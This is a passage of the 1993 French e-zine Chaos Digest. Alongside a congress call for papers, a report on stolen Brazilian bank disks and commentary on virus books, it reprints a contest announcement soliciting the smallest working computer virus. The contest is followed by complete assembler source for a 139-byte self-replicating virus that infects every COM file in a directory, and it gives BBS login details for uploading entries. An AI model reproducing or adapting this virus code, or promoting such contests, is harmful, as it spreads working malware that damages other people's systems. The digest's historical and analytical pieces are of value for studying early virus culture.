THE AIMS

of the Congress are: provide a forum to explore common interests, interplay
across disciplines, and to bring researchers state of the art advances in
all areas of computer science, scientific computing, software engineering,
applied and computational mathematics. The official language of the
Congress is English, only papers submitted in English will be considered.

CALL FOR PAPERS

Papers and Minisymposia are invited in all areas of: Numerical Analysis;
Applied Probability and Statistics; Theory of Computing; Optimization and
Operations Research; Scientific Computation; Parallel Processing;
Programming Languages; Symbolic Computation; Supercomputing; CASE Tools;
Fuzzy Systems; Databases; Networks; Neural Nets; Artificial Intelligence;
Computer Graphics; Data Security; Simulation and Modelling; Mathematical
Education; Interval/Self-Validating Computations. Telecomminications.

CONTRIBUTED PAPERS/POSTER PRESENTATIONS

The program will also include contributed paper sessions (20-minutes
presentation), posters, and industrial exhibits. Authors are invited to
submit to the CSAM'93 Program Committee a one page abstract and indicate if
they prefer an oral or poster session. Authors may suggest the title(s) of
appropriate session(s) for their paper. Manuscripts of papers presented at
the Congress will be published as CSAM'93 Proceedings after the Congress. A
volume containing all abstracts of the accepted papers and description of
all minisymposia including titles and speakers known by May 1, 1993, will
be available for the participants at the Congress. Late papers and
sessions, if accepted, may be presented at the Congress and will be listed in
the Supplementum to the final program.

EXHIBITOR INFORMATION

Booths and tables will be available to companies wishing to display their
products and/or services.

MINISYMPOSIA/SECTIONS PROPOSAL

The Program Committee invites you, as a potential organizer, to submit a
proposal for a minisymposium (section). A minisymposium is a session of
several speakers focusing on a single topic. Minisymposium organizers are
responsible for the scientific quality of papers in their sessions,
consequently all papers invited by organizers are automatically accepted.

PROGRAM COMMITTEE

S.Baranoff (Russia), C.Brezinski (France), B.Christiansen (UK), D.Claudio
(Brazil), G.Corliss (USA), C.Evequoz (Canada), H.Fischer (Germany),
N.Holsti (Finland), D.Gay (USA), D.Grigoriev (USA), B.Kearfott (USA),
R.Klatte (Germany), K.Madsen (Denmark), S.Markov (Bulgaria), G.Menshikov
(Russia), M.Meyer (Germany), V.Nesterov (Russia), V.Shaidurov (Russia),
D.Shiriaev (Germany), S.Shirokov (Russia), S.Voitenko (Russia), W.Walster
(USA), W.Walter (Germany), J.Wolff von Gudenberg (Germany), A.Yakovlev
(Russia)

MINISYMPOSIA/SECTIONS ANNOUNCED

  Approximation - Claude Brezinski (France)
  Numerical Algorithms - Claude Brezinski (France)
  Computer System Security - Jean-Bernard Condat (France)
  Fortran 90 Programming Language - W.Brainerd (USA)
  Application Software for Macintosh - S.Shirokov (Russia)
  Interval/Self-Validation Computations - V.Nesterov (Russia)
  Automatic Differentiation - H.Fischer (Germany)
  Complexity in Symbolic Computations - D.Grigoriev (USA)
  Constraint Satisfaction Techniques and Constraint Logic Programming -
    M.Meyer (Germany)
  Performance Evaluation of Computer Communications - Claude Evequoz
    (Canada)
  Parallel Processing - Claude Evequoz (Canada)
  Mathematics of Modeling Biological Neurons - Arno Klaassen (France)

DEADLINES

Minisymposium proposals: As soon as possible;
Early submissions due: March 1, 1993;
Normal submissions due: May 1, 1993;
Late submissions: After May 1, 1993.

CONFERENCE LOCATION

Russia, St.Petersburg, Aerodromnaya 4, Education Center

REGISTRATION FEES

Their include admission to all minisymposia, sections and lectures, program
materials, admission to exhibits, refreshments, congress reception, and a
visit to the theatre or philharmonics.

Accompanying persons are welcome. Their fee includes the congress
reception, a visit to the theatre or philharmonics, a guided tour to Peter
and Paul Fortress and Cathedral and a cruise along the Neva river. An
Associates Program with visits to all the places of interest in
St.Petersburg will be offered for modest additional fees.

The student fee does not include the congress reception and the visit to
the theatre. Students must also enclose a statement from their university.

All participants will be provided with a card for all St.Petersburg public
transport (including underground) for the period of the Congress.

                         EARLY           NORMAL
Student                  $ 50            $ 60
Regular                  $ 190           $ 240
Associate                $ 75            $ 75

The Early fee applies to all fees received by April 1, 1993.
The Normal fee applies to all fees received after April 2, 1993.

Registration fees can be refunded only if cancellations are received by the
CSAM'93 Secretariat in writing. Refunds will be made as follows:
Cancellations received by April 1, 1993:
    Refund minus bank charges;
Cancellations received April 2, 1993 to June 1, 1993:
    Refund minus bank charges less $ 50 service charge.
No refunds can be made for cancellations received after June 1, 1993.
Substitution of a participant is possible any time.

VISAS

Please check with the Russian Embassy or Consulate to determine if you need
a visa. In the case you need it please use your registration receipt as the
visa support letter.


ACCOMMODATION

A large block of rooms is being held for CSAM'93 at the Congress Center
from July 17 to July 26. In case an overflow happens, blocks of rooms are
also being held at nearby hotels. We encourage you to book through the
CSAM'93 Secretariat. Participants who wish to reserve a room themselves
should bear in mind the difficulty in finding hotel rooms in St.Petersburg
during the summer.

The total price of your stay must be paid together with the registration
fees. In exchange you receive a lodging voucher with your registration
receipt.

Accommodation fees can be refunded only if cancellations are received by
the CSAM'93 Secretariat in writing. Refunds will be made as follows:
Cancellations received May 1, 1993
    Refund minus bank charges
Cancellations received May 2, 1993 to June 15 1993
    Refund minus bank charges minus $ 50 service charge.
Cancellations received after June 15 1993.
    Refund minus bank charges minus one night stay charge.

All bedrooms have private bath and/or shower. Rates include full breakfast,
tax and service charges.  The prices are $ 60 per night for a single room
or $ 40 per person per night in a double room.  The basic student hostel
accommodation: single room with no private bath or shower is offered at $20
per night for a person.

METHOD OF PAYMENT

Please pay the appropriate amount in US dollars by remittance on the
account:

   Deutsche Bank Karlsruhe, Germany
   Account No.: 0142018
   Bank Routing Code: 66070004
   Purpose: CSAM'93 Congress

We are sorry that we cannot accept credit cards or checks.  Payment must be
enclosed with the registration form.  Please do not forget to indicate
*Participant Name* and *CSAM'93 Congress* on all payments.

ABOUT ST-PETERSBURG

St-Petersburg (pop. 5 mil.), the historical capital of Russia, is one of
the major tourist attractions in the world. The city is situated on more
than 40 islands in the delta of the Neva River.  There are a lot of
museums, palaces and theaters to visit.  Among these are the Hermitage
museum with its 3 mil. exhibits, Winter Palace and magnificent summer
residences of Russian Tsars, the third largest cathedral in the world St-
Isaaks Cathedral and many others. The Associates Program of the Congress
will provide the opportunity to visit all places of interest in St-
Petersburg.

WEATHER

Since much of St.Petersburg fascination is historical, architectural and
cultural, it can be enjoyed at any time.  Typical July weather is bright
and pleasant.  Expect temperatures between 20 and 23 degrees C (67 - 72 F).

INFORMATION

 CSAM'93 Secretariat,
 Dr. Sergey S. Voitenko, Director,
 Center of Modern Communications
 of St-Petersburg University,
 Mail Box 835,
 Russia, 199178 St-Petersburg,
 Fax: +7 812 394-5004
 e-mail: csam93@polylog.spb.su

Abstracts can be sent in paper or electronic form.  Abstracts in paper form
must be sent to the CSAM'93 Secretariat.  Outside of the former USSR
abstracts in electronic form (Postscript or LATEX are welcome) must be sent
to:  Dimitri Shiriaev: dima@iamk4508.rz.uni-karlsruhe.de.

Please return this registration form by registered airmail to the CSAM'93
Secretariat (and a copy by E-mail) as soon as possible.  Please use one
form per person. Copy it if necessary.

----------------------------- cut here ----------------------------

                         REGISTRATION FORM

             Last name:
                  Name:
Title (Mrs,Mr,Dr,Prof):
           Affiliation:
               Address:

               Country:                      City:
                   ZIP:                      Tel:
                   FAX:                      E-mail: (Highly desirable!)


Fees
                      EARLY          NORMAL
Student               [ ]   $ 50      [ ]  $ 60
Academic              [ ]  $ 190      [ ] $ 240
Associate             [ ]   $ 75      [ ]  $ 75

Lodging facilities (please check)

                   July, 1993
[ ]17  [ ]18  [ ]19  [ ]20  [ ]21  [ ]22 [ ]23  [ ]24  [ ]25 [ ]26

[ ] single hotel room:   $  60     per day x  ___ days =
[ ] double hotel room:   $  80     per day x  ___ days =
[ ] triple hotel room:   $ 100     per day x  ___ days =

[ ] single student room: $  20     per day x  ___ days =

Total amount :

Date:                         Signature:

------------------------------

Date: Thu, 21 Jan 93 19:56 GMT
From: 0003965782@mcimail.com (Sanford Sherizen )
Subject: File 4--Donnees Secretes sur les Reserves Cambiales Bresiliennes
Repost from: Risks-Forum Digest


A Reuters report found in the NY Times (21 Jan 1993) states that computer
disks holding secret information on Brazil's banking reserves have disappe-
ared from the central bank.  The federal police are investigating the loss.
According to the report, President Itamar Franco "took the unusual step" of
releasing information on the reserves to offset any damage or financial
speculation from loss of the disks.  The disks held information on day-to-
day reserve operations and details like where the reserves are invested,
what they consisted of and how the reserves were generated.

COMMENTS

This disappearance may be related to ex-President Collar's involvement in
the looting of Brazil.  At a minimum, the data disappearance seems to be
another indication of the Post-Hacker Era, where governments and companies
have learned that computers can be used as an essential aspect of crime
and/or to cover up a crime.  The lines between "hacker" activities and
"legitimate" activities may become increasingly less clear.  In order to
almost have to use computer techniques.  While there continues to be an
(often unconscious) image that many have that computer crime is "bad
individuals" against "good" organizations, the Organization as Computer
Criminal is rapidly becoming a serious problem.  One but certainly not the
only instance of this is the recent British Airway's penetration of Virgin
Air's resercations system.

[Moderateur: Voici l'article du _NY Times_ dont il est fait question:

++++
Brazil data are missing
New York Times  PP: D, 20:4  Jan 21, 1993  ISSN: 0362-4331  JRNL CODE: NY
DOC TYPE: Newspaper article  LANGUAGE: English

ABSTRACT:  A  spokesman  for President Itamar Franco of Brazil said Jan 20,
1993  that  computer  disks  holding secret information on Brazil's banking
reserves  have  disappeared from the central bank. Police are investigating
the loss.

GEOGRAPHIC NAMES: Brazil
DESCRIPTORS: Bank reserves; Central banks; Government documents]

------------------------------

Date: Paris, le 8 Fevrier 1993
From: Ambassade du Bresil, Paris
Subject: File 5--Incident du Vol de Disquettes (lettre)


Ambassade du Bresil
34 Cours Albert Ier
75008 Paris


                                           Monsieur Jean-Bernard Condat
                                           CCCF
                                           47, rue des Rosiers
                                           93400 Saint-Ouen


     Monsieur,

     En reponse a votre lettre du 31 janvier, je vous confirme la publication,
par le quotidien bresilien "O GLOBO", d'un article relatif a un vol de
disquettes de la Banque Centrale qui contiendraient des donnees secretes sur
les reserves cambiales bresiliennes.

2.   En effet, l'Agence Brasil/RADIOBRAS, qio envoie chaque jour a l'Ambassade
du Bresil un resume des principales matieres publiees par les grands journaux
bresiliens, a transmis, le 20 janvier, un court resume de l'article ci-dessus.

3.   Je regrette de ne pouvoir vous envoyer copie du texte integral, etant
donne que l'Ambassade ne dispose plus de l'exemplaire du "GLOBO" dans lequel
il a ete publie.

4.   Vous trouverez ci-apres le nom et les numeros de telephone et de fax de
la correspondante du GLOBO a Paris, pour une eventuelle obtention deu texte
integral:

                          Mme Helena Celestino
                          Tel 42 79 80 78
                          Fax 43 22 66 12

5.   D'autre part, la revue VEJA du 26 Janvier, dans un article intitule "Le
citoyen commun", concernant un autre sujet, mentionne rapidement, a la fin de
l'article, l'incident du vol des disquettes.

6.   J'espere que ces renseignements seront utiles a votre projet.

     Veuillez agreer, Monsieur, mes salutations distinguees.


                                  Celina Assumpcao do Valle Pereira
                                         Ministre-Conseiller

------------------------------

Date: Sun Jan 10 13:00:58 -0500 1993
From: jbcondat@ATTMAIL.COM (Chaos Computer Club France )
Subject: File 6--Reactions sur "The Little Black Book of Computer Virus"
Copyright: Coastal Associates Publishing L.P., 1992


 Balancing  fears,  rights  in  wars  against  viruses; a little black book
     reveals  secrets  and  highlights  some  difficult  issues  facing the
     computer  industry.  (Mark Ludwig's 'The Little Black Book of Computer
     Viruses, Volume I') (Issues and Trends)(MacInTouch)
 Ford, Ric
 MacWEEK  VOL.: v6  ISSUE: n26  PAGINATION: p96(1)
 PUBLICATION DATE: July 13, 1992

  A little black book reveals secrets and highlights some difficult issues
facing the computer industry.

  Rights in conflict. Wars always raise difficult questions about the
limits of civil liberties, and the current war on computer viruses is no
exception.
     At the moment, anti-viral forces are battling to contain a breach in
the information curtain--a little black book from a virus researcher and
enthusiast that details step-by-step recipes for cooking up programs to
infect MS-DOS systems.

     Black book. The author, Mark Ludwig, is a physicist who became
interested in viruses and found it difficult to obtain detailed technical
information about them.

     "I find that the whole field is very secretive," Ludwig said. "There's
a closed group of people who have access to viruses and pass them around
among themselves."

     Unwilling to agree to their codes of secrecy, Ludwig struck out on his
own, setting up a bulletin board system and soliciting contributions of
viruses, which he analyzed.

     In Ludwig's introduction to "The Little Black Book of Computer
Viruses, Volume I," he explains his rationale: "I am convinced that
computer viruses are not evil and that programmers have a right to create
them, possess them and experiment with them."
     He warns repeatedly against irresponsible use of the virus recipes in
the book but also expresses concern about governmental abuse of power.

     "The book is a bad thing," said David Stang, chairman of the
International Computer Security Association. "We should have a law,
somehow, against it."

     He blamed an earlier book for spawning hundreds of viruses and said
defenders of such publications "have yet to show us an example of a good
virus."

     As Stang points out, Ludwig's book lacks anti-viral utilities, and it
offers little assistance to system administrators contending with real and
imagined virus threats.

     Other critics reportedly have called for bookstore boycotts, picketing
and similar protests against distribution of the book.

     The ICSA and the National Computer Security Association (which is open
to end users and organizations) analyze viruses and anti-viral programs,
primarily from DOS systems.
     Stang claims a collection of some 10,000 viruses. "I receive viruses
from anyone, but I don't trade," he said.

     The two groups distribute selected information through several public
and private channels, but current policies rule out public distribution of
sensitive materials, such as source code and viruses themselves.

     Cops and criminals. In the Macintosh community, the virus problem is
smaller and under better control than in the DOS world.

     An international "police force" shares viruses and information among
its members, many of whom are programmers of anti-viral utilities.

     This cooperative group releases bulletins to the public about new
viruses and assists in identifying and prosecuting virus writers. Its
identity and the identity of most of its members are secret.

     The group's low profile helps discourage macho challenges between
virus and anti-virus programmers, and its members avoid being overwhelmed
by thousands of false reports triggered by various other Mac bugs and
features.
     Individual responsibility. As standardization and networking grow, so
does the virus threat. Imagine a virus infecting a room full of Newton
Personal Digital Assistants sharing information in a meeting.

     Simultaneously, threats to individual computer users' rights also seem
to be on the rise. Consider the Secret Service's raid on game publisher
Steve Jackson or the implications of the FBI's new telephone-monitoring
proposal.

     In the end, responsibility for securing our systems lies ultimately in
our own hands. Free exchange of information and control over our own
systems are our most effective defensive weapons, and we should not
compromise them in a war that has never claimed a life.

------------------------------

End of Chaos Digest #1.08
************************************

Chaos Digest            Mercredi 17 Fevrier 1993        Volume 1 : Numero 9

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.09 (17 Fev 1993)
File 1--Annonce du 1er "International Computer Virus Writing Contest"
File 2--Exemple d'ecriture d'un CPA sur 139 bytes
File 3--Un Createur de CPA peut-il etre Patriotique?
File 4--Glossaire de l'Insecurite Informatique

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost from jbcondat@attmail.com. The editors may be
contacted by voice (+33 1 47874083), fax (+33 1 47877070) or S-mail at:
Jean-Bernard Condat, Chaos Computer Club France [CCCF], 47 rue des Rosiers,
93400 St-Ouen, France

Issues of Chaos-D can also be found on some French BBS. Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * ftp.eff.org (192.88.144.4) in /pub/cud
        * red.css.itd.umich.edu (141.211.182.91) in /cud
        * halcyon.com (192.135.191.2) in /pub/mirror/cud
        * ftp.ee.mu.oz.au (128.250.77.2) in /pub/text/CuD
        * nic.funet.fi (128.214.6.100) in /pub/doc/cud

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Fri Feb 12 18:30:04 GMT 1993
From: jbcondat@attmail.com (Chaos Computer Club France )
Subject: File 1--Annonce du 1er "Intl. Computer Virus Writing Contest"


                         W E L C O M E

                              T O

                             T H E

                           F I R S T

    * * * * * * * * * * * * * * * * * * * * * * * * * * * *
    *                                                     *
    *              I N T E R N A T I O N A L              *
    *                                                     *
    *                   C O M P U T E R                   *
    *                                                     *
    *                      V I R U S                      *
    *                                                     *
    *                    W R I T I N G                    *
    *                                                     *
    *                    C O N T E S T                    *
    *                                                     *
    * * * * * * * * * * * * * * * * * * * * * * * * * * * *

                         -  1 9 9 3 -

          Final Date For Submissions:  APRIL 1, 1993


                 This Contest is Sponsored by:

               American Eagle Publications, Inc.
                        P. O. Box 41401
                      Tucson, AZ 85717 USA

     Publisher of The Little Black Book of Computer Viruses

    * * * * * * * * * * * * * * * * * * * * * * * * * * * *
    !  DISTRIBUTE THIS FILE ALL OVER THE KNOWN UNIVERSE   !
    * * * * * * * * * * * * * * * * * * * * * * * * * * * *

        Ok, all you genius hackers out there! Here is a challenge
for you. Prove your stuff!

        This is an INTERNATIONAL contest, and this file is
being circulated all over the world, so if you want to compete,
be forewarned, you've got worldwide competition. Only the best
have a chance in this game.

Still up to the challenge?

Ok, here it is:

I am writing Volume 2 of The Little Black Book of Compter
Viruses. This is a study of the scientific applications of
computer viruses, and their use in artificial life research,
and all of that neat stuff. One of the things I want to discuss
in the book is the limit on the size of a virus for a given
level of functionality. So I took the TIMID virus from Volume 1
and tore it down to the bare minimum. Not good enough. I wrote
a virus that worked a little differently. I tore that one down
to the bare minimum. Good enough? Well maybe. But maybe not.
I have some pretty compact code, but is it the absolute best?
I'm guessing somebody out there can top it.

Here are the rules:

(1) The object of this game is to write the smallest
    virus you can with the required level of functionality.

(2) The virus must be capable of infecting all COM files
    on the logged drive in the current directory of a PC,
    no matter how many COM files are there. It may infect
    them as quickly or as slowly as you like, so long as
    it can be demonstrated that it will do so in an hour,
    when running the programs in that directory one after
    the other in sequential order.

(3) The virus must recognize itself and avoid re-infecting
    files that have been infected. At most, only one in
    fifty thousand files should get accidently re-infected,
    assuming that the data in unknown COM files is random.

(4) The virus must terminate gracefully if it cannot find a
    file to infect.

(5) The virus must not destroy any of the code in any file
    which it infects. It must allow that code to execute
    properly, or refuse to infect a file.

(6) The virus must be self-contained. It cannot hide
    code in some common location on disk.

(7) The virus must function properly under MS-DOS 5.0 with
    no TSR's resident, and nothing loaded high.

(8) The size will be determined by the larger of (A) the
    number of bytes the virus code itself takes up in
    an infected file, and (B) the largest number of bytes
    the virus adds to a program when it infects it.

The best code I have for a virus that follows these rules right
now is 139 bytes long. Both source and executable are included
in the ZIP, named LITTLE.ASM and LITTLE.COM.

In the event of a tie for size, originality and ingenuity of
the code will break the tie. All judges decisions are final.

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

The winner will receive the following:

(1) A $100 CASH REWARD.

(2) Your code will be published in "The Little Black Book
    of Computer Viruses", Volume 2.

(3) I will give you credit for the code and for winning
    the International Virus Contest in the book, using
    either your real name or an alias, your choice,
    published in the book.

(4) Your name will be posted on the MISS bulletin board
    as the contest winner.

(5) A free copy of "The Little Black Book of Computer
    Viruses", Volume 2, and a one year subscription to
    Computer Virus Developments Quarterly ($95 value).

Three honorable mention winners will receive a free copy of
The Little Black Book of Computer Viruses, Volume 2.

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

You may make an entry in two ways:

(1) Mail your entry on a PC format floppy disk to American Eagle
Publications, Inc., PO Box 41401, Tucson, AZ 85717 USA.

(2) Upload your entry to the M.I.S.S. bulletin board at
(805)251-0564 in the USA. Log on as GUEST, password VIRUS,
last 4 digits of phone number 0000, and upload to the CONTEST
UPLOADS directory.

A valid entry consists of the following items:

(A) Complete source code for a virus, which can be assembled
using either TASM, MASM, or A86. If you use another assembler
and don't know if one of the above will work, then send the
assembler along with the submission. If you do anything tricky
that we may not understand, you must explain it in comments in
the assembler source.

(B) A statement of who you are (aliases accepted) and how to
get in touch with you in case you win the contest. This
information will be kept strictly confidential, and encrypted
at all times.

By submitting an entry to the contest, you agree that the
copyright to your entry will be considered the property of
American Eagle Publications. The copyright to any losing
entry will be returned to the owner upon written request.
In the event that you win or receive honorable mention in the
contest, the copyright to the code will remain the property
of American Eagle Publications, Inc.

You may submit your entry encrypted with PGP 2.1 if you
desire. Use the following public key to encrypt:

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.1

mQBNAitZ9w4AAAECAOXJYOsJNavAAWFBRwf4/u0QWMJ9IHj8eajgOfDRdlCNwEBJ
wMs1vb5GcdJCaeoCgBR3Xxzh6oEo2nrwfru8mqMABRG0CE1BTHVkd2ln
=P6d4
-----END PGP PUBLIC KEY BLOCK-----

Go to it!

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

               D O N ' T   M I S S   O U T  ! ! !

                       Get Your Very Own

            International Virus Writing Contest 1993

                            T-SHIRT

 Great fun to wear to your local user's group meeting, or the
 next computer security conference you attend. Sure to get
 people's attention and initiate lots of interesting
 conversation. Specify Small, Medium, or Large.

                           Only $9.95

                              from

               American Eagle Publications, Inc.
                         P.O. Box 41401
                        Tucson, AZ 85717

        (US Customers please add $3.00 for UPS delivery)
   (Overseas customers please add $7.50 for airmail delivery)
   (Overseas customers please add $3.00 for surface delivery)
                 (AZ residents add 5% sales tax)

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

American Eagle Publications, Inc., gives you first class
information to learn the ins and outs of viruses. You may
order any of the following items from American Eagle
Publications, PO Box 41401, Tucson, AZ 85717. (Shipping is $2.00
to the US, $7.50 for overseas airmail.) AZ residents add 5%
sales tax.

The Little Black Book of Computer Viruses, Volume 1,
by Mark Ludwig. This award-winning book will teach you the
basics of how viruses work in no-nonsense terms. 192 pgs.,
$14.95.

The Little Black Book of Computer Viruses Program Disk. All
of the programs in the book, both source code and executables,
$15.00.

Computer Virus Developments Quarterly, This takes up where the
Little Black Book leaves off, providing the reader with
quarterly updates on viruses and anti-virus  technology.
For the advanced security specialist or programmer. One year
subscription with diskettes, $75.00 postpaid, overseas airmail
add $10.00.

Computer Virus Developments Quarterly, current single issue,
$25.00. (Please inquire as to price and availability of back
issues)

Technical Note #1: The Pakistani Brain Virus, a complete
disassembly and explanation. This is one of the first boot
sector viruses ever written, and the first stealth boot sector
virus. It hides on floppy disks and inserts the label (c) Brain
on the disk. 32 page booklet and diskette with assembler source
and compiled virus, $20.00.

Technical Note #2: The Stoned Virus, a complete disassembly and
explanation. The Stoned is the world's most successful boot
sector virus. It infects floppy disks and hard disks. Find out
what makes it tick. 24 page booklet and diskette with assembler
source, compiled virus, and detection tool, $20.00.

Technical Note #3: The Jerusalem Virus, a complete disassembly
and explanation. Jerusalem is an old but highly effective virus
which hides in memory, and infects every program you try to
execute. It starts deleting programs on Friday the 13th. Booklet
and diskette with assembler source and compiled virus, $20.00.

Technical Note #4: How to Write Protect an MFM Hard Disk. The
only hard-and-fast way to stop viruses from spreading is to
physically write-protect your disk. This tech note tells you how
to do it for the older MFM style drives. Some companies
sell such devices for hundreds of dollars, but this booklet
will tell you how to do the job for under $20. Complete with
theory, circuit diagrams, and a circuit board layout. No
diskette, $12.00.

How to Become a Virus Expert, a 60 minute audio tape by author
Mark Ludwig tells you how to get hold of the critical information
you need to protect your computers, and stop relying on some anti-
virus product developer to spoon-feed you. $10.00.

Wanted: Translators for these works in all languages and outlets
for these works in all countries. An opportunity for big $$ awaits
the enterprising person. Please contact us.

+++++++
No Virus Contest is complete without POLITICAL COMMENT:

Freedom is only free if it is VOLUNTARY. If you live in a
"democratic" nation that will not allow secession, then you DO
NOT live in a free country. The democracies of this world are
learning how to become tyrannies. Support a Secession Ammendment
for your constitution, before it is too late and you wish you
had. Secession is the only logical way to short-circuit the trend
toward big government and tyranny, short of all-out civil war.
+++++++

------------------------------

Date: Fri Feb 12 18:30:04 GMT 1993
From: jbcondat@attmail.com (Chaos Computer Club France )
Subject: File 2--Exemple d'ecriture d'un CPA sur 139 bytes


;A small (139 byte) virus with minimal required functionality.

;This Virus for research purposes only. Please do not release!
;Please execute it only on a carefully controlled system, and only
;if you know what you're doing!

;An example for


;#######################################################
;#    THE FIRST INTERNATIONAL VIRUS WRITING CONTEST    #
;#                        1 9 9 3                      #
;#                      sponsored by                   #
;#            American Eagle Publications, Inc.        #
;#######################################################


;Assemble this file with TASM 2.0 or higher: "TASM LITTLE;"
;Link as "TLINK /T LITTLE;"

;Basic explanation of how this virus works:
;
;The virus takes control when the program first starts up. All of its code
;is originally located at the start of a COM file that has been infected.
;When the virus starts, it takes over a segment 64K above the one where the
;program was loaded by DOS. It copies itself up there, and then searches
;for an uninfected file. To determine if a file is infected, it checks the
;first two bytes to see if they are the same as its first two bytes. It
;reads the file into memory right above where it is sitting (at 100H in the
;upper segment).  If not already infected, it just writes itself plus the
;file it infected back out to disk under the same file name. Then it moves
;the host in the lower segment back to offset 100H and executes it.


   .model  tiny            ;Tiny model to create a COM file

   .code

;DTA definitions
DTA             EQU     0000H           ;Disk transfer area
FSIZE           EQU     DTA+1AH         ;file size location in file search
FNAME           EQU     DTA+1EH         ;file name location in file search


   ORG     100H

;*************************************************************************
;The virus starts here.

VIRSTART:
   mov     ax,ds
   add     ax,1000H
   mov     es,ax               ;upper segment is this one + 1000H
   mov     si,100H             ;put virus in the upper segment
   mov     di,si               ;at offset 100H
   mov     cl,BYTE (OFFSET HOST AND 0FFH)
                               ;can't code this with TASM
   mov     cl,8BH              ;we can assume ch=0
   rep     movsb               ;this will louse the infection up if run
                               ;under debug!
   mov     ds,ax               ;set ds to high segment
   push    ds
   mov     ax,OFFSET FIND_FILE
   push    ax
   retf                        ;jump to high memory segment

;Now it's time to find a viable file to infect. We will look for any COM
;file and see if the virus is there already.
FIND_FILE:
   xor     dx,dx               ;move dta to high segment
   mov     ah,1AH              ;so we don't trash the command line
   int     21H                 ;which the host is expecting
   mov     dx,OFFSET COMFILE
   mov     ch,3FH              ;search for any file, no matter what
                               ;attribute (note: cx=0 before this instr)
   mov     ah,4EH              ;DOS search first function
   int     21H
CHECK_FILE:
   jc      ALLDONE             ;no COM files to infect

   mov     dx,FNAME            ;first open the file
   mov     ax,3D02H ;r/w access open file, since we'll want to write to it
                int     21H
   jc      NEXT_FILE           ;error opening file - quit and say this
                               ;file can't be used
   mov     bx,ax               ;put file handle in bx, and leave it there
                               ;for the duration

   mov     di,FSIZE
   mov     cx,[di]             ;get file size for reading into buffer
   mov     dx,si               ;and read file in at HOST in new segment
                               ;(note si=OFFSET HOST)
   mov     ah,3FH              ;DOS read function
   int     21H
   mov     ax,[si]             ;si=OFFSET HOST here
   jc      NEXT_FILE           ;skip file if error reading it

   cmp     ax,WORD PTR [VIRSTART]
;see if infected already
   jnz     INFECT_FILE         ;nope, go do it

   mov     ah,3EH              ;else close the file
   int     21H                 ;and fall through to search for another file

NEXT_FILE:
   mov     ah,4FH              ;look for another file
   int     21H
   jmp     SHORT CHECK_FILE    ;and go check it out

COMFILE    DB      '*.COM',0

;When we get here, we've opened a file successfully, and read it into
;memory.  In the high segment, the file is set up exactly as it will look
;when infected. Thus, to infect, we just rewrite the file from the start,
;using the ;image in the high segment.
INFECT_FILE:
   xor     cx,cx
   mov     dx,cx               ;reset file pointer to start of file
   mov     ax,4200H
   int     21H

   mov     ah,40H
   mov     dx,100H
   mov     cx,WORD PTR [di]    ;adjust size of file for infection
   add     cx,OFFSET HOST - 100H
   int     21H                 ;write infected file

   mov     ah,3EH              ;close the file
   int     21H

;The infection process is now complete. This routine moves the host
;program down so that its code starts at offset 100H, and then transfers
;control to it.
ALLDONE:
   mov     ax,ss               ;set ds, es to low segment again
   mov     ds,ax
   mov     es,ax
   push    ax                  ;prep for retf to host
   shr     dx,1                ;restore dta to original value
   mov     ah,1AH              ;for compatibility
   int     21H
   mov     di,100H             ;prep to move host back to original location
   push    di
   mov     cx,sp               ;move code, but don't trash the stack
   sub     cx,si
   mov     cx,0FE6FH           ;hand code the above to save a byte
   rep     movsb               ;move code
   retf                        ;and return to host

;***************************************************************************
;The host program starts here. This one is a dummy that just returns control
;to DOS.

HOST:
   mov     ax,4C00H            ;Terminate, error code = 0
   int     21H

HOST_END:

   END     VIRSTART

------------------------------

Date: 29 Jan 93 15:59:00 +0000
From: ercm20@festival.edinburgh.ac.uk (Sam Wilson )
Subject: File 3--Un Createur de CPA peut-il etre Patriotique?
Repost: Virus-L Digest #6.16 (4 Fev 93)


The following letter and editorial response appears in the February
1993 issue of the UK magazine 'Personal Computer World' under the
heading "Spreading viruses":

      We are a bunch of programmers who, depressed with the lack of
   viruses that have originated in England, have sought to change
   matters.  We presently write viruses for the PC, Archimedes and Atari
   ST.  We have increased the few viruses written in England by about
   25, though this number is increasing all the time as our programmers
   churn out more quality computer viruses.
      Although there are many viruses about we hope to dominate the UK
   'market'.  Won't it be nice, though, for England to have at least one
   export?
      Finally, we as an organisation like to stress that, contrary to
   public opinion, we are *not* boring people who wear anoraks, nor are
   we depraved people who were beaten as children and so grew up with a
   hatred of humanity.
      We are highly intelligent and good at programming and are just
   ordinary people.  But we are gonna get you soon!


                                                                   ARCV
                                  (Association of Really Cruel Viruses)
[And the editor replies:]

   You say you're not depraved people?  Perhaps you weren't beaten as
   children, but as far as we're concerned you should be beaten as adults.


I wish it were the April issue...

Sam Wilson
Network Services Division
Computing Services, The University of Edinburgh
Edinburgh, Scotland, UK

------------------------------

Date:    Fri, 12 Feb 93 23:26:52 +0000
From:    tegra!vail@uunet.UU.NET (Johnathan Vail )
Subject: File 4--Glossaire de l'Insecurite Informatique
Repost from: Virus-L Digest #6.26 (16 Feb 1993)


________________________________________________________________________


                Glossary of Computer Insecurity

           Compiled by Johnathan Vail (vail@tegra.com)
        Created by several people on comp.virus newsgroup

________________________________________________________________________


async interrupt (attack) - to exploit system vulnerabilities arising
    from deficiencies in the interrupt management facilities of an
    operating system.


back door - This is an undocumented feature added to a product which
    can allow those who know about it to gain access to features that are
    otherwise protected.  The original Tempest video game was supposed to
    have a key sequence that would allow the author of the firmware to get
